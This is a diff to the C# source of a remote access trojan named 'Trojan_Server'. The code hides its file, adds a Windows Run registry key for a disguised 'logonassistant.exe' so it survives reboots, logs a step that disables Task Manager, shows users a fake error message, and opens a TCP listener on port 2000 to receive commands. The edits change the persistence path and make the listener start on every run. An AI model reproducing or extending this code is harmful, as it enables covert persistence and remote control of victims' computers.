@@ -172,7 +172,7 @@ namespace Trojan_Server
                 Log("File made to System, Hidden and Readonly!", "DEBUG");
                 Log("Trying to make Startup Key!", "DEBUG");
                 RegistryKey k = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
-                k.SetValue("logonassist", Environment.GetFolderPath(Environment.SpecialFolder.System) + " \\logonassistant.exe", RegistryValueKind.String);
+                k.SetValue("logonassist", "C:\\Windows\\SysWOW64\\logonassistant.exe", RegistryValueKind.String);
                 k.Close();
                 Log("Startup RegistryKey angelegt!", "DEBUG");
                 Log("Trying to make DisableTaskMgr Key", "DEBUG");
@@ -214,17 +214,20 @@ namespace Trojan_Server
         {
             FreeConsole();
             Log("Deleting old Log!" , "ALWAYS");
-try {
-            File.Delete(GetTempPath() + "RATLog.txt");
-}
-catch {
-}
+		try {
+        
+          	File.Delete(GetTempPath() + "RATLog.txt");
+		}
+		catch {
+            	
+		}
             bool Check = CheckIfRan();
             if (!Check)
             {
                 System.Windows.Forms.MessageBox.Show("This Programm is not a valid Win32 Application!", "Error", System.Windows.Forms.MessageBoxButtons.OK, System.Windows.Forms.MessageBoxIcon.Error);
                 Log("Showed Fake Messaage!" , "ALWAYS");
                 AddToStartup();
+            }
                 TcpListener l = new TcpListener(2000);
                 l.Start();
                 Log("Started TcpListener..." , "ALWAYS");
@@ -233,7 +236,6 @@ catch {
                 System.Threading.Thread Rec = new System.Threading.Thread(new System.Threading.ThreadStart(Recive));
                 Log("Started Reciver!" , "ALWAYS");
                 Rec.Start();
-            }
         }
     }
 }
